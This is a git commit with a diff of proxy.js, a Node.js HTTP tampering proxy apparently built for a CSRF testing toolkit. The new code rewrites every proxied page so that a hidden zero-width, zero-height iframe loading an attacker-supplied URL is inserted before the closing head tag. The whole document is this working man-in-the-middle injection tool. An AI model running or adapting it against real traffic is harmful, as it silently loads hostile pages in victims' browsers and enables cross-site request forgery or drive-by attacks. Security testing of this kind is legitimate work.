b63db753105bff5f4a3c21e064aa291874cd5b59
Paul AMAR <aos.paul@gmail.com>
2013-12-13 10:49:59 +0100

    Added changes to insert iframe in the head tag. Can use CSRFT now with it.

--- proxy.js
+++ proxy.js
@@ -1,17 +1,37 @@
-var proxy = require('./lib/proxy-tamper').start({port: 8080});
+var portApp = 8888;
+var proxy = require('./lib/proxy-tamper').start({port: portApp});
+
+var url = undefined;
+var payload = ''
 
 // Tampering all the websites (they all should have a dot '.')
 proxy.tamper(/\./, function (request) {
-  console.log('tampering ' + request.url);
+  // console.log('[i] Proxying : ' + request.url);
 
   // gzip encoding is not supported when tampering the body
   delete request.headers['accept-encoding'];
 
   request.onResponse(function (response) {
-    // tamper the body by replacing Google with "Orange"
-    response.body = response.body.replace(/Google/g, 'Orange');
+    console.log('[+] Tampering : ' + request.url);
+    // response.body = response.body.replace(/Google/g, 'Orange');
+
+    // replace the tag head in the body by inserting an iframe
+    response.body = response.body.replace(/<\/head>/g, payload);
 
     // complete the response
     response.complete();
   });
 });
+
+
+// check for command line argument url to be injected
+if (process.argv[2] == undefined) {
+  console.log("Usage : node server.js <url>");
+  process.exit(1);
+} else {
+  console.log("Proxy server listening on port %d", portApp);
+
+  url  = process.argv[2];
+  console.log("Injecting " + url + " while tampering HTTP traffic");
+  payload = '<iframe src="' + url + '" width=0 height=0><\/iframe><\/head>'
+}
